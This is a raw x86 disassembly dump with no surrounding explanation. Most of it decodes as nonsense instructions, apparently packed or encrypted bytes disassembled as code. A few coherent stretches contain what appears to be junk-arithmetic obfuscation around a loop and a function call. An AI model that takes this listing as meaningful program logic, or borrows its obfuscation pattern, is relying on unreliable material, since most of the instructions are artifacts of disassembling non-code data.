  4071a8:	push   0x83dffa14
  4071ad:	les    eax,FWORD PTR [ecx+0x81c0515]
  4071b3:	jae    0x4071e4
  4071b5:	dec    BYTE PTR [ecx]
  4071b7:	sub    eax,edx
  4071b9:	cmp    BYTE PTR [ebx],cl
  4071bb:	in     al,dx
  4071bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071bd:	fsub   DWORD PTR [eax+edx*1-0x2b]
  4071c1:	je     0x407162
  4071c3:	cmp    al,0x45
  4071c5:	sub    ah,BYTE PTR [edx+ebp*8+0x6ad1e72c]
  4071cc:	mov    ebp,0x2ba7d73c
  4071d1:	(bad)  [edi+edx*1+0x1eded03c]
  4071d8:	imul   BYTE PTR es:[ecx-0x60]
  4071dc:	pusha  
  4071dd:	inc    ebp
  4071de:	(bad)  
  4071df:	xor    dl,dh
  4071e1:	lea    esp,[ecx]
  4071e3:	push   esp
  4071e4:	jnp    0x40716a
  4071e6:	sbb    ecx,DWORD PTR [ebp-0x19129015]
  4071ec:	daa    
  4071ed:	fld    DWORD PTR [edi]
  4071ef:	add    eax,0x99267598
  4071f4:	jmp    0x29aa:0x40b1860e
  4071fb:	out    dx,eax
  4071fc:	sub    dh,ch
  4071fe:	cmp    al,0xf4
  407200:	aas    
  407201:	jge    0xb749c945
  407207:	add    DWORD PTR [ebx+0x375e225],ebp
  40720d:	and    edi,DWORD PTR [ebx-0x26]
  407210:	xchg   ecx,eax
  407211:	out    0x26,al
  407213:	(bad)  
  407214:	push   cs
  407215:	aas    
  407216:	dec    eax
  407217:	add    BYTE PTR [edx],cl
  407219:	clc    
  40721a:	xchg   BYTE PTR [ecx],ch
  40721c:	mov    al,0x54
  40721e:	pop    edx
  40721f:	inc    ecx
  407220:	pusha  
  407221:	mov    esp,0xb34bab9e
  407226:	addr16 ret 0x1e30
  40722a:	mov    dl,0x20
  40722c:	jae    0x4071af
  40722e:	fs fs enter 0x7d71,0x3f
  407234:	or     BYTE PTR [edx],ch
  407236:	fdiv   st,st(3)
  407238:	xchg   DWORD PTR [esi],edx
  40723a:	inc    edi
  40723b:	test   DWORD PTR [esi-0x80],edi
  40723e:	nop    DWORD PTR [edi]
  407241:	sahf   
  407242:	(bad)  
  407243:	sbb    dl,BYTE PTR [edx-0x1a]
  407246:	mov    ebx,0xde2586dc
  40724b:	clc    
  40724c:	sbb    BYTE PTR [ecx+edx*4-0x20],0xb4
  407251:	push   ss
  407252:	dec    edx
  407253:	inc    ebp
  407254:	aaa    
  407255:	(bad)  
  407256:	push   ecx
  407257:	rcr    esp,cl
  407259:	fadd   st,st(4)
  40725b:	push   esi
  40725c:	pop    ds
  40725d:	scas   eax,DWORD PTR es:[edi]
  40725e:	pop    ds
  40725f:	loopne 0x40729a
  407261:	shr    BYTE PTR [esi+0x11],cl
  407264:	(bad)  
  407265:	popa   
  407266:	ffree  st(2)
  407268:	mov    WORD PTR [edi],fs
  40726a:	js     0x40726f
  40726c:	pop    esp
  40726d:	adc    al,0xe3
  40726f:	int    0x9e
  407271:	pop    ebp
  407272:	and    al,0x33
  407274:	call   0x8b1b:0x78ae3355
  40727b:	sub    BYTE PTR [edi+0x7c4996c],0x95
  407282:	adc    DWORD PTR [edx+0x3e],eax
  407285:	nop
  407286:	push   ecx
  407287:	fadd   DWORD PTR [ecx-0x16]
  40728a:	sahf   
  40728b:	jo     0x407240
  40728d:	push   0xd4222808
  407292:	cmp    al,0x9
  407294:	inc    ebp
  407295:	sbb    BYTE PTR [esi-0x6ec66f81],0x37
  40729c:	xlat   BYTE PTR ds:[ebx]
  40729d:	push   0x67
  40729f:	mov    dl,0xf9
  4072a1:	pop    ecx
  4072a2:	inc    ebx
  4072a3:	push   esi
  4072a4:	xchg   edx,eax
  4072a5:	rol    DWORD PTR [ecx-0x20],1
  4072a8:	shr    DWORD PTR [esi+0x3bdba5c3],1
  4072ae:	mov    DWORD PTR [edi],ebx
  4072b0:	jns    0x407315
  4072b2:	xchg   edx,eax
  4072b3:	lods   eax,DWORD PTR ds:[esi]
  4072b4:	call   ecx
  4072b6:	lods   al,BYTE PTR ds:[esi]
  4072b7:	xchg   edx,eax
  4072b8:	repz dec ebx
  4072ba:	pop    edx
  4072bb:	stos   BYTE PTR es:[edi],al
  4072bc:	neg    DWORD PTR [eax+eax*8]
  4072bf:	xchg   cl,ch
  4072c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4072c2:	mov    esp,0x5721fc5b
  4072c7:	xor    eax,eax
  4072c9:	test   BYTE PTR [eax],ch
  4072cb:	adc    ah,al
  4072cd:	js     0x40732c
  4072cf:	xchg   esp,eax
  4072d0:	mov    eax,0xc68f03a8
  4072d5:	jmp    DWORD PTR [esp+esi*2]
  4072d8:	sbb    al,0xce
  4072da:	ret    
  4072db:	daa    
  4072dc:	jp     0x40727c
  4072de:	push   ebx
  4072df:	dec    eax
  4072e0:	aad    0xee
  4072e2:	pop    edx
  4072e3:	push   ss
  4072e4:	loopne 0x40734b
  4072e6:	lods   al,BYTE PTR ds:[esi]
  4072e7:	cli    
  4072e8:	dec    edx
  4072e9:	mov    ch,0xeb
  4072eb:	xchg   ebx,eax
  4072ec:	aas    
  4072ed:	push   ecx
  4072ee:	jle    0x40736e
  4072f0:	mov    ah,0x7e
  4072f2:	or     BYTE PTR ds:0xb75a569d,0xc9
  4072f9:	mov    bl,0x9f
  4072fb:	or     bl,dl
  4072fd:	imul   ecx,ebx,0xb40fd0d0
  407303:	jecxz  0x4072ca
  407305:	scas   al,BYTE PTR es:[edi]
  407306:	cdq    
  407307:	or     ch,cl
  407309:	cmp    cl,BYTE PTR [edx+eax*2+0xe]
  40730d:	dec    edi
  40730e:	push   esi
  40730f:	mov    ebx,0xc9883da2
  407314:	loop   0x40733b
  407316:	rcl    BYTE PTR [ecx],1
  407318:	leave  
  407319:	jae    0x4072b4
  40731b:	(bad)  
  40731c:	call   0x9b4d6efd
  407321:	push   ecx
  407322:	out    dx,al
  407323:	pop    es
  407324:	push   ebx
  407325:	js     0x407399
  407327:	ds enter 0xadcf,0xe2
  40732c:	and    ebx,DWORD PTR [edi-0x3]
  40732f:	mov    esi,0xaba3cda7
  407334:	mov    dl,0x77
  407336:	out    dx,al
  407337:	nop
  407338:	add    BYTE PTR [eax+0x67],dh
  40733b:	aam    0xaa
  40733d:	loop   0x407391
  40733f:	adc    dl,0xf6
  407342:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407343:	push   cs
  407344:	loop   0x407388
  407346:	scas   eax,DWORD PTR es:[edi]
  407347:	mov    eax,DWORD PTR [ebp-0xc]
  40734a:	add    DWORD PTR ds:0x42fcd1,0x42e703
  407354:	xor    eax,esi
  407356:	add    DWORD PTR ds:0x42fcfd,0x57f6
  407360:	add    eax,edi
  407362:	xor    DWORD PTR ds:0x42e70f,0x2a11
  40736c:	mov    DWORD PTR [ebp-0x18],eax
  40736f:	mov    DWORD PTR [ebp-0x1c],0xf89c853c
  407376:	mov    BYTE PTR [ebp-0x1],0x67
  40737a:	and    DWORD PTR ds:0x42fcfd,0x0
  407384:	mov    eax,ds:0x42fcfd
  407389:	inc    eax
  40738a:	mov    ds:0x42fcfd,eax
  40738f:	cmp    DWORD PTR ds:0x42fcfd,0xe
  407396:	jne    0x4073a2
  40739c:	call   DWORD PTR ds:0x42e45f
  4073a2:	cmp    DWORD PTR ds:0x42fcfd,0xd
  4073a9:	jne    0x4073ba
  4073af:	mov    eax,ds:0x42fcfd
  4073b4:	inc    eax
  4073b5:	mov    ds:0x42fcfd,eax
  4073ba:	cmp    DWORD PTR ds:0x42fcfd,0x1d
  4073c1:	jb     0x407384
  4073c7:	mov    eax,DWORD PTR [ebp-0xc]
  4073ca:	xor    eax,esi
  4073cc:	and    DWORD PTR ds:0x42e128,0xdb
  4073d6:	add    eax,edi
  4073d8:	or     DWORD PTR ds:0x42e707,0x71a5
  4073e2:	mov    DWORD PTR [ebp-0x18],eax
  4073e5:	adc    eax,0x7137
  4073ea:	jmp    0x407737
  4073ef:	or     DWORD PTR ds:[edi],eax
  4073f2:	(bad)  
  4073f3:	rcl    edx,cl
  4073f5:	cmp    DWORD PTR [ecx],edx
  4073f7:	pop    ecx
  4073f8:	jns    0x4073c5
  4073fa:	popa   
  4073fb:	adc    esi,DWORD PTR [edi]
  4073fd:	cmp    cl,0xf7
  407400:	iret   
  407401:	jo     0x407473
  407403:	and    BYTE PTR [ebp+0x70],bh
  407406:	jo     0x4073d7
  407408:	call   FWORD PTR [esi]
  40740a:	add    ebx,esi
  40740c:	sub    BYTE PTR [edx+0x5d],0x71
  407410:	sub    cl,bl
  407412:	jo     0x407476
  407414:	fucomip st,st(0)
  407416:	push   edi
  407417:	push   ecx
  407418:	cli    
  407419:	pop    es
  40741a:	retf   0x679
  40741d:	xlat   BYTE PTR ds:[ebx]
  40741e:	pop    esp
  40741f:	mov    ebp,0xf6e45748
  407424:	sub    DWORD PTR [esi],edx
  407426:	push   edx
  407427:	mov    bh,0x6b
  407429:	push   cs
  40742a:	addr16 loop 0x4074a4
  40742d:	inc    ecx
  40742e:	inc    ebp
  40742f:	xchg   edx,eax
  407430:	xor    eax,0xa6b53e1e
  407435:	jb     0x4073ba
  407437:	or     ecx,edi
  407439:	call   FWORD PTR [edx+0x638ce40e]
  40743f:	sub    BYTE PTR [eax],al
  407441:	fstp   DWORD PTR [ebx+0x37]
  407444:	jne    0x407445
  407446:	fstp   QWORD PTR [edx+0x35fe40f8]
  40744c:	sub    DWORD PTR [ebx+0x9],edx
  40744f:	or     ebx,DWORD PTR [ecx-0x45]
  407452:	mov    es:0x3c834d4e,al
  407458:	loop   0x40744a
  40745a:	and    edx,DWORD PTR [edi+0x36fee186]
  407460:	pop    edx
  407461:	jp     0x4074b5
  407463:	in     eax,dx
  407464:	and    BYTE PTR [ebx],cl
  407466:	adc    ecx,DWORD PTR [edi-0x29]
  407469:	jmp    0xa9fa18a8
  40746e:	cs rcl dh,0x44
  407472:	inc    edx
  407473:	das    
  407474:	push   ebp
  407475:	push   ds
  407476:	dec    eax
  407477:	cwde   
  407478:	mov    edi,0xa5d61757
  40747d:	sar    BYTE PTR [ecx+edx*1-0x429242ab],cl
  407484:	bnd jmp 0x74bd043e
  40748a:	push   esi
  40748b:	jb     0x40750c
  40748d:	call   0x4c3eb4f9
  407492:	mov    bh,0x51
  407494:	sti    
  407495:	add    esi,DWORD PTR [ecx]
  407497:	mov    WORD PTR [edx-0x72292e79],ds
  40749d:	mov    esp,0xbcc79652
  4074a2:	jne    0x407497
  4074a4:	push   ebx
  4074a5:	lods   al,BYTE PTR ds:[esi]
  4074a7:	inc    esp
  4074a8:	lahf   
  4074a9:	in     al,0x17
  4074ab:	xchg   edi,eax
  4074ac:	icebp  
  4074ad:	test   DWORD PTR [ecx],edx
  4074af:	fmul   DWORD PTR ds:0xa03220c4
  4074b5:	mov    dh,0x47
  4074b7:	iret   
  4074b8:	push   esp
  4074b9:	sahf   
  4074ba:	stc    
  4074bb:	jmp    DWORD PTR [eax+0x72]
  4074be:	sbb    ebx,DWORD PTR [ebx]
  4074c0:	cli    
  4074c1:	loop   0x407533
  4074c3:	cmp    BYTE PTR [eax],0xcb
  4074c6:	inc    esi
  4074c7:	or     ecx,ebx
  4074c9:	retf   0xb42e
  4074cc:	dec    edi
  4074cd:	sar    DWORD PTR [ecx+ebp*8-0x7a95f8c6],cl
  4074d4:	xchg   ebx,edi
  4074d6:	jb     0x40750e
  4074d8:	inc    ebp
  4074d9:	lock jg 0x407479
  4074dc:	pop    es
  4074dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074de:	out    0xe6,eax
  4074e0:	mov    dh,0x3d
  4074e2:	mov    edx,ebp
  4074e4:	sbb    al,0xbb
  4074e6:	aad    0xc8
  4074e8:	clc    
  4074e9:	icebp  
  4074ea:	js     0x40756a
  4074ec:	and    dh,bl
  4074ee:	mov    ?,WORD PTR [eax]
  4074f0:	mov    ah,0x27
  4074f2:	mov    BYTE PTR [ecx-0x29],bh
  4074f5:	les    esi,FWORD PTR [edi+ecx*4]
  4074f8:	xlat   BYTE PTR ds:[ebx]
  4074f9:	aas    
  4074fa:	dec    eax
  4074fb:	xchg   esp,eax
  4074fc:	fbld   TBYTE PTR [ebx-0x4603e39a]
  407502:	outs   dx,BYTE PTR ds:[esi]
  407503:	cmp    DWORD PTR [ebx],0xffffffe7
  407506:	in     eax,dx
  407507:	retf   
  407508:	sbb    al,ch
  40750a:	mov    cx,0xbe5e
  40750e:	fiadd  DWORD PTR [ebp+0x73]
  407511:	jns    0x40755d
  407513:	and    ch,bh
  407515:	lahf   
  407516:	mov    bl,0x11
  407518:	cmp    DWORD PTR [ebx+0x1b],ebp
  40751b:	je     0x407526
  40751d:	out    0x53,al
  40751f:	je     0x407541
  407521:	or     dl,0x97
  407524:	imul   BYTE PTR es:[eax+0x2b]
  407528:	daa    
  407529:	dec    ecx
  40752a:	jb     0x4075a3
  40752c:	or     esp,esp
  40752e:	scas   al,BYTE PTR es:[edi]
  40752f:	dec    ebx
  407530:	call   0x6548:0x2d1a7a64
  407537:	mov    ebx,0x21c41ccb
  40753c:	mov    ds:0x5cd49778,al
  407541:	outs   dx,BYTE PTR ds:[esi]
  407542:	jbe    0x407559
  407544:	xor    eax,0x3b6e57f5
  407549:	inc    ecx
  40754a:	cmp    eax,0x17e80a5a
  40754f:	cmp    al,0x8d
  407551:	and    eax,0x8a3228
  407556:	xor    eax,0x18891fe5
  40755b:	sub    esp,esi
  40755d:	js     0x407513
  40755f:	mov    esp,eax
  407561:	mov    ah,0x3
  407563:	(bad)  [esi+0x2e]
  407566:	neg    DWORD PTR [esi]
  407568:	cmp    cl,BYTE PTR [ecx]
  40756a:	popf   
  40756b:	and    al,0x65
  40756d:	fistp  QWORD PTR es:[ebp-0x3b]
  407571:	push   esi
  407572:	cmp    al,0x68
  407574:	into   
  407575:	mov    edi,0x92597739
  40757a:	fwait
  40757b:	cmp    BYTE PTR [edi+0x57defe07],dh
  407581:	std    
  407582:	(bad)  
  407583:	outs   dx,DWORD PTR ds:[esi]
  407584:	pop    ecx
  407585:	dec    dl
  407587:	push   0x296f9b78
  40758c:	adc    al,0x2
  40758e:	pop    edi
  40758f:	out    dx,al
  407590:	les    edx,FWORD PTR [ebp-0x3e38fa9c]
  407596:	pushf  
  407597:	push   edi
  407598:	jecxz  0x4075e4
  40759a:	jmp    0x121b:0x2da183d4
  4075a1:	push   esi
  4075a2:	scas   eax,DWORD PTR es:[edi]
  4075a3:	xchg   esp,eax
  4075a4:	in     al,dx
  4075a5:	mov    ebp,0xca5b4c4f
  4075aa:	push   ebp
  4075ab:	repnz repz mov bh,0xa8
  4075af:	mov    ds:0x13741df1,eax
  4075b4:	sbb    ebp,DWORD PTR [ebp+edi*4+0x4fb26299]
  4075bb:	shl    BYTE PTR [eax],1
  4075bd:	sub    edi,ecx
  4075bf:	out    dx,al
  4075c0:	in     eax,dx
  4075c1:	fdiv   QWORD PTR [esi-0x54]
  4075c4:	cmp    eax,0x42ab2e6f
  4075c9:	(bad)  
  4075ca:	rol    DWORD PTR [eax],1
  4075cc:	std    
  4075cd:	pushf  
  4075ce:	mov    cl,dh
  4075d0:	(bad)  
  4075d2:	sub    BYTE PTR [ecx-0x4e],al
  4075d5:	scas   eax,DWORD PTR es:[edi]
  4075d6:	jp     0x4075bf
  4075d8:	cmc    
  4075d9:	mov    eax,0x1917e442
  4075de:	fnstenv [eax-0x1e0aa3f9]
  4075e4:	outs   dx,DWORD PTR ds:[esi]
  4075e5:	sti    
  4075e6:	mov    cl,0x5e
  4075e8:	fadd   DWORD PTR ds:0x43775e9a
  4075ee:	xlat   BYTE PTR ds:[ebx]
  4075ef:	jns    0xf56bd463
  4075f5:	or     dl,BYTE PTR [eax-0x1a]
  4075f8:	push   ecx
  4075f9:	adc    DWORD PTR [ecx+0x612cbe1e],ecx
  4075ff:	(bad)  
  407600:	mov    al,ds:0xc94ebf8b
  407605:	push   esi
  407606:	daa    
  407607:	ins    BYTE PTR es:[edi],dx
  407608:	pop    edi
  407609:	cwde   
  40760a:	add    DWORD PTR [esp+edx*4+0x43],0x17a2f2e0
  407612:	pop    eax
  407613:	add    DWORD PTR [ebp+0x1b041532],0xc642cc27
  40761d:	stos   BYTE PTR es:[edi],al
  40761e:	adc    DWORD PTR [ebx-0x34286f88],eax
  407624:	stc    
  407625:	dec    edi
  407626:	dec    edx
  407627:	call   0x2fa6d2ba
  40762c:	mov    edi,0xe62f3371
  407631:	gs jmp 0x63f3:0x30f82b88
  407639:	retf   0xe14b
  40763c:	mov    ?,WORD PTR [edx+0x3289e638]
  407642:	push   0x227bf3c3
  407647:	lock ins DWORD PTR es:[edi],dx
  407649:	std    
  40764a:	xchg   esp,eax
  40764b:	pop    ebx
  40764c:	xor    BYTE PTR [eax],bh
  40764e:	jp     0x407612
  407650:	sbb    ebx,esp
  407652:	mov    bl,0x54
  407654:	mov    eax,0x8b56ca43
  407659:	cli    
  40765a:	test   al,0xe2
  40765c:	repz lahf 
  40765e:	das    
  40765f:	les    esi,FWORD PTR [ebp-0x1f]
  407662:	mov    ecx,0xbbe49a7
  407667:	test   esi,ebx
  407669:	shl    BYTE PTR [ebp+0x71],0xa2
  40766d:	fidiv  DWORD PTR [edx-0x6e]
  407670:	sbb    ebp,ecx
  407672:	retf   
  407673:	adc    al,BYTE PTR [ebx+0x5]
  407676:	xor    DWORD PTR [edi-0x35],ebx
  407679:	sbb    DWORD PTR [edx-0x61],esp
  40767c:	sub    dh,BYTE PTR [ebp+0x2]
  40767f:	xchg   ebp,eax
  407680:	bnd jne 0x4076bf
  407683:	popa   
  407684:	cmp    DWORD PTR [edx],ecx
  407686:	mov    bl,0x63
  407688:	pop    es
  407689:	lds    ebx,FWORD PTR [ebx]
  40768b:	sti    
  40768c:	jmp    0xd97:0xdc0ce49a
  407693:	sbb    DWORD PTR [ecx*1-0xd7cd131],0x51
  40769b:	fcomp  QWORD PTR [edi-0x68]
  40769e:	aam    0x26
  4076a0:	ins    BYTE PTR es:[edi],dx
  4076a1:	push   esp
  4076a2:	adc    DWORD PTR [ebx],ebp
  4076a4:	je     0x40767f
  4076a6:	in     eax,dx
  4076a7:	clc    
  4076a8:	sub    ah,BYTE PTR [eax+0x73dbe53a]
  4076ae:	rcl    eax,cl
  4076b0:	push   es
  4076b1:	not    DWORD PTR [edi]
  4076b3:	int3   
  4076b4:	mov    eax,0xfd121160
  4076b9:	mov    ecx,0x84bb6a10
  4076be:	jecxz  0x407670
  4076c0:	ja     0x407740
  4076c2:	jmp    0x3994:0xca8a2ee6
  4076c9:	or     eax,0xc17655f2
  4076ce:	lahf   
  4076cf:	cmc    
  4076d0:	pop    edi
  4076d1:	fldz   
  4076d3:	xchg   ecx,eax
  4076d4:	mov    bh,0x21
  4076d6:	cmp    esp,DWORD PTR [eax+0x7902d3f4]
  4076dc:	in     al,dx
  4076dd:	jmp    0x4076c0
  4076df:	(bad)  
  4076e0:	in     al,dx
  4076e1:	add    al,BYTE PTR [ecx]
  4076e3:	dec    esp
  4076e4:	and    BYTE PTR [eax],ah
  4076e6:	stos   DWORD PTR es:[edi],eax
  4076e7:	outs   dx,BYTE PTR ds:[esi]
  4076e8:	mov    edx,0x45bad18d
  4076ed:	mov    bh,0x6d
  4076ef:	cmp    ah,ah
  4076f1:	adc    al,bl
  4076f3:	pop    ebp
  4076f4:	sub    al,0x98
  4076f6:	xchg   edi,eax
  4076f7:	xor    al,0xb5
  4076f9:	jmp    0xab2c021a
  4076fe:	fsubr  st,st(3)
  407700:	aad    0xdc
  407702:	fwait
  407703:	xchg   esi,eax
  407704:	repz jp 0x4076dd
  407707:	test   eax,0xd65ead30
  40770c:	jb     0x407760
  40770e:	adc    DWORD PTR [esi-0x61],esi
  407711:	lahf   
  407712:	test   dl,cl
  407714:	enter  0x593a,0x34
  407718:	or     eax,0x2c6f8d31
  40771d:	aam    0xa9
  40771f:	mov    fs,WORD PTR [esi]
  407721:	xchg   ebx,eax
  407722:	push   ebp
  407723:	push   esp
  407724:	mov    bh,ch
  407726:	cmp    eax,0x1d06822
  40772b:	(bad)  
  40772c:	sbb    DWORD PTR ds:0x8e345fbe,ebp
  407732:	jmp    0x407734
  407734:	iret   
  407735:	dec    esi
  407736:	dec    DWORD PTR [ebx-0x39cc23bb]
  40773c:	add    eax,edi
  40773e:	adc    DWORD PTR ds:0x42e11c,0x42fd09
  407748:	push   eax
  407749:	inc    eax
  40774a:	mov    eax,DWORD PTR [ebp-0x28]
  40774d:	sbb    DWORD PTR ds:0x42fcd1,0x6777
  407757:	xor    eax,esi
  407759:	add    eax,edi
  40775b:	push   eax
  40775c:	mov    eax,DWORD PTR [ebp-0x1c]
  40775f:	or     DWORD PTR ds:0x42e6ef,0x4a3f
  407769:	xor    eax,esi
  40776b:	add    DWORD PTR ds:0x42fcf1,0x266c
  407775:	add    eax,edi
  407777:	xor    DWORD PTR ds:0x42e70f,0x42e6eb
  407781:	push   eax
  407782:	lea    eax,[ebp-0x78]
  407785:	push   eax
  407786:	add    DWORD PTR ds:0x42e6ff,0x5eb6
  407790:	push   DWORD PTR [ebp-0xc]
  407793:	adc    DWORD PTR ds:0x42e703,0x2bbb
  40779d:	push   DWORD PTR [ebp-0x14]
  4077a0:	call   0x405e60
  4077a5:	adc    DWORD PTR ds:0x42fce5,0x42fd6e
  4077af:	test   eax,eax
  4077b1:	je     0x407e83
  4077b7:	lea    eax,[ebp-0x78]
  4077ba:	sbb    DWORD PTR ds:0x42fd82,0x6660
  4077c4:	push   eax
  4077c5:	mov    eax,DWORD PTR [ebp-0x14]
  4077c8:	jmp    0x407b15
  4077cd:	xlat   BYTE PTR ds:[ebx]
  4077ce:	and    BYTE PTR [eax+eiz*8+0x73],ch
  4077d2:	ins    BYTE PTR es:[edi],dx
  4077d3:	push   ebx
  4077d4:	aaa    
  4077d5:	pop    edx
  4077d6:	push   ecx
  4077d7:	push   ebx
  4077d8:	sahf   
  4077d9:	push   esi
  4077da:	mov    ch,0x99
  4077dc:	mul    BYTE PTR [edi+0x207070cc]
  4077e2:	jge    0x407854
  4077e4:	jo     0x4077bd
  4077e6:	mov    ebp,0x1d0fc29
  4077eb:	pmullw mm6,QWORD PTR [eax+edx*4+0x49]
  4077f0:	loopne 0x407795
  4077f2:	xor    ebp,DWORD PTR [eax-0x35310c33]
  4077f8:	xor    ecx,DWORD PTR [ecx+eiz*2+0x41]
  4077fc:	test   DWORD PTR [esi+0x60],esp
  4077ff:	(bad)  
  407800:	xchg   ebp,eax
  407801:	jp     0x4077dd
  407803:	out    0x75,eax
  407805:	sbb    al,0xd3
  407807:	jae    0x4077c0
  407809:	adc    eax,0x1ef7df3d
  40780e:	inc    esi
  40780f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407810:	mov    ch,0xdc
  407812:	cmp    dl,bl
  407814:	inc    eax
  407815:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407816:	mov    ebp,0x17fbaf38
  40781b:	pop    edx
  40781c:	adc    BYTE PTR [ebx],bh
  40781e:	mov    al,ds:0xc2c66fe2
  407823:	dec    ebx
  407824:	pop    esi
  407825:	push   es
  407826:	jge    0x4077d0
  407828:	test   dh,0xd4
  40782b:	cmp    cl,BYTE PTR [edi-0x30]
  40782e:	pop    ecx
  40782f:	dec    eax
  407830:	xchg   ecx,eax
  407832:	repnz push 0x3786d774
  407838:	mov    ch,0x4
  40783a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40783b:	(bad)
  40783e:	lea    ebx,[esi]
  407840:	mov    bh,0xe9
  407842:	xor    BYTE PTR [ecx+0x55857214],0x43
  407849:	cdq    
  40784a:	loope  0x407867
  40784c:	mov    ds:0xdb280c1a,eax
  407851:	mov    DWORD PTR ds:0xeddff21,ebx
  407857:	jl     0x407886
  407859:	push   cs
  40785a:	and    edx,esp
  40785c:	add    bh,ah
  40785e:	sbb    ebp,edi
  407860:	sub    al,0x43
  407862:	mov    ch,0xf9
  407864:	sbb    al,0x7
  407866:	(bad)  
  407868:	mov    ds:0xf669dab2,al
  40786d:	cmp    al,BYTE PTR [eax+eax*4+0xd]
  407871:	jge    0x4078ed
  407873:	mov    gs,WORD PTR [eax+0x5712fbd3]
  407879:	mov    bl,0x23
  40787b:	pop    ebx
  40787c:	push   ebp
  40787d:	and    BYTE PTR [eax-0x49],ah
  407880:	mov    esi,0x5d167569
  407885:	pop    esp
  407886:	das    
  407887:	stos   DWORD PTR es:[edi],eax
  407888:	imul   edx,ebp,0xffffffb3
  40788b:	mov    dh,dl
  40788d:	xlat   BYTE PTR ds:[ebx]
  40788e:	outs   dx,BYTE PTR ds:[esi]
  40788f:	sub    edi,eax
  407891:	mov    al,0x66
  407893:	xor    al,bh
  407895:	popf   
  407896:	sub    al,0x26
  407898:	inc    ebp
  407899:	lahf   
  40789a:	mov    al,0x5a
  40789c:	push   ss
  40789d:	aas    
  40789e:	xchg   esp,eax
  40789f:	jo     0x407864
  4078a1:	ins    DWORD PTR es:[edi],dx
  4078a2:	jns    0x40790d
  4078a4:	sub    ch,0xaf
  4078a7:	sbb    esi,DWORD PTR [eax-0x43]
  4078aa:	pop    edx
  4078ab:	jo     0x4078db
  4078ad:	int3   
  4078ae:	mov    eax,0x971847e4
  4078b3:	lds    eax,FWORD PTR [eax-0x42]
  4078b6:	cwde   
  4078b7:	mov    al,ds:0x50f4f29
  4078bc:	shl    DWORD PTR [ebp-0x757b1a6f],0xd6
  4078c3:	std    
  4078c4:	push   edi
  4078c6:	push   0xffffffca
  4078c8:	adc    al,0xb6
  4078ca:	mov    eax,0xaa80968
  4078cf:	imul   DWORD PTR [edx-0x15]
  4078d2:	cmp    al,0xb8
  4078d4:	mov    ecx,0x738572f1
  4078d9:	mov    cl,0xf8
  4078db:	or     dl,BYTE PTR [edi-0x7a0bbf30]
  4078e1:	pop    edx
  4078e2:	in     eax,dx
  4078e3:	sub    BYTE PTR [esi],bl
  4078e5:	lods   eax,DWORD PTR ds:[esi]
  4078e6:	xchg   esp,eax
  4078e7:	sbb    DWORD PTR [ecx+0x589e0740],ecx
  4078ed:	adc    al,0x37
  4078ef:	jp     0x40795f
  4078f1:	scas   al,BYTE PTR es:[edi]
  4078f2:	inc    edx
  4078f3:	and    cl,dh
  4078f5:	inc    ebx
  4078f6:	and    edi,eax
  4078f8:	icebp  
  4078f9:	test   DWORD PTR [edx-0xed4d33b],0xda898012
  407903:	xchg   esi,eax
  407904:	cmp    esp,DWORD PTR [edx+0x618def00]
  40790a:	push   esi
  40790b:	int    0x6d
  40790d:	or     al,0x9c
  40790f:	bnd jp 0x4078a5
  407912:	or     DWORD PTR [edi-0x68dcf45c],ebp
  407918:	xor    eax,0x851a5b90
  40791d:	mov    dh,0x66
  40791f:	push   edx
  407920:	arpl   WORD PTR [eax-0x59],di
  407923:	jmp    0x4078f4
  407925:	push   0x479bd71c
  40792a:	icebp  
  40792b:	inc    ecx
  40792c:	retf   
  40792d:	mov    cl,al
  40792f:	pop    ss
  407930:	xlat   BYTE PTR ds:[ebx]
  407931:	dec    BYTE PTR [ecx+0x6a]
  407934:	je     0x40793f
  407936:	mov    DWORD PTR [edx-0x52],esp
  407939:	stos   BYTE PTR es:[edi],al
  40793a:	aam    0xcc
  40793c:	mov    ds:0x575052b7,eax
  407941:	push   0x7b7e89ac
  407946:	cs daa 
  407948:	ins    BYTE PTR es:[edi],dx
  407949:	ss push ds
  40794b:	cmc    
  40794c:	push   edi
  40794d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40794e:	mov    esi,0x126a8f20
  407953:	int    0xda
  407955:	nop
  407956:	fcmove st,st(3)
  407958:	mov    cl,0x63
  40795a:	pop    es
  40795b:	or     bl,BYTE PTR [esi]
  40795d:	mov    cl,0xb4
  40795f:	std    
  407960:	mov    edi,0x5b24fce5
  407965:	mov    ebp,0x5f046654
  40796a:	mov    BYTE PTR [eax],dh
  40796c:	mov    eax,ds:0xb20b908b
  407971:	adc    al,0xf0
  407973:	xchg   BYTE PTR [esi],dl
  407975:	leave  
  407976:	and    cl,BYTE PTR [esp+eax*2]
  407979:	test   DWORD PTR [esp+edi*8-0x4e],ecx
  40797d:	pushf  
  40797e:	push   ds
  40797f:	and    esp,DWORD PTR [edi+0x2c6d6898]
  407985:	mov    eax,ds:0xedfe49db
  40798a:	pop    es
  40798b:	(bad)  [esi-0x4c]
  40798e:	popf   
  40798f:	mov    ds:0xabae75ac,eax
  407994:	and    BYTE PTR [eax+esi*1+0x5bcba270],ch
  40799b:	sbb    ch,ah
  40799d:	das    
  40799e:	mov    ds:0x3933cd2a,eax
  4079a3:	inc    ebp
  4079a4:	call   0x2814b674
  4079a9:	ret    
  4079aa:	scas   al,BYTE PTR es:[edi]
  4079ab:	xor    al,0xe2
  4079ad:	mov    esp,0xf9e0a885
  4079b2:	push   0x70
  4079b4:	aaa    
  4079b5:	call   0x898576
  4079ba:	jmp    0x40795f
  4079bc:	dec    ebp
  4079bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079be:	push   0x25
  4079c0:	and    eax,0xc70f42b5
  4079c5:	jle    0x4079b8
  4079c7:	fimul  DWORD PTR [ebp+0x13]
  4079ca:	loopne 0x4079a0
  4079cc:	jmp    FWORD PTR [ebp-0x6e]
  4079cf:	(bad)  
  4079d0:	jbe    0x40798c
  4079d2:	xchg   edx,eax
  4079d3:	xchg   ebx,eax
  4079d4:	jg     0x4079e4
  4079d6:	sbb    BYTE PTR [ecx+0x5e],0x62
  4079da:	jbe    0x407979
  4079dc:	call   0xbe0e43c8
  4079e1:	push   edx
  4079e2:	jae    0x407a57
